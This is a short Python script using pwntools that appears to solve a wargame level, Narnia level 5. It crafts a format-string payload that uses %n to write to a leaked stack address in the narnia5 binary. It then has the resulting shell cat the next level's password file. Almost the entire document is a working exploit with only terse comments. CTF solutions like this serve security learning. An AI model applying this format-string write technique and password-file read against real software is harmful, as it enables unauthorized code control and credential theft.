# must be run from the machine - over ssh mangles the payload somehow
from pwn import *

leaked = 0xffffd6c0
payload = p32(leaked) # address that %n will dereference to write to
payload += b'%496u' # 496 plus length of address makes 500
payload += b'%1$n'  # buffer is at position 1 on the stack
write("payload.txt", payload)

p = process([b'/narnia/narnia5', payload])

p.recvuntil(b'GOOD\n')
p.sendline(b'cat /etc/narnia_pass/narnia6')
print('\nnarnia6 pass: ' + p.recvline().decode())

p.close()